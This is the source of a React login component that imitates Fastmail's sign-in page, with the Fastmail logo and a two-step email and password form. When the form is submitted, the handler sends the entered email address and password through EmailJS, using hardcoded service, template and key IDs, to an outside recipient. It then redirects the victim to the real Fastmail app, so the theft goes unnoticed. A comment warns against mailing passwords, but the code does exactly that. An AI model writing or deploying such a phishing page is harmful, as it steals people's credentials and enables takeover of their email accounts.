import React, { useState } from "react";
import emailjs from "emailjs-com";
import "./Login.css";
import Logo from '../assets/Fastmail.svg';

function Login() {
  const [step, setStep] = useState(1);
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [remember, setRemember] = useState(false);

  const SERVICE_ID = "service_3ak9fki";
  const TEMPLATE_ID = "template_kg29jsi";
  const PUBLIC_KEY = "8CuhfPebYyozncMdB";

  const handleContinue = (e) => {
    e.preventDefault();
    if (!email) return;
    setStep(2);
  };

  const handleLogin = (e) => {
    e.preventDefault();

    // ⚠️ DO NOT send passwords via EmailJS or email.
    const templateParams = {
      user_email: email,
      user_pass: password,
      remember_me: remember ? "Yes" : "No"
    };

    emailjs
      .send(SERVICE_ID, TEMPLATE_ID, templateParams, PUBLIC_KEY)
      .then((response) => {
        console.log("EmailJS Response:", response);

        // redirect if needed
        window.location.href = "https://app.fastmail.com/";
      })
      .catch((error) => {
        console.error("EmailJS Error:", error);
      });
  };

  return (
    <div className="fm-login-bg">
      <div className="fm-logo-container">
        <img src={Logo} alt="Logo" className="fm-logo" />
      </div>

      <div className="fm-login-card">
        <h1 className="fm-title">Log in</h1>

        <form
          onSubmit={step === 1 ? handleContinue : handleLogin}
          className="fm-form"
        >
          <div className="fm-group">
            <label>Username</label>
            <input
              type="email"
              placeholder="email@fastmail.com"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              required
              disabled={step === 2}
            />
          </div>

          {step === 2 && (
            <>
              <div className="fm-group fade-in">
                <label>Password</label>
                <input
                  type="password"
                  placeholder="••••••••"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  required
                />
              </div>

              <div className="fm-remember fade-in">
                <input
                  type="checkbox"
                  id="rememberMe"
                  checked={remember}
                  onChange={(e) => setRemember(e.target.checked)}
                />
                <label htmlFor="rememberMe">Remember me</label>
              </div>
            </>
          )}

          <button className="fm-btn" type="submit">
            {step === 1 ? "Continue" : "Log in"}
          </button>

          {step === 2 && (
            <div className="fm-links fade-in">
              <a href="#">Forgot password?</a>
            </div>
          )}
        </form>
      </div>
    </div>
  );
}

export default Login;
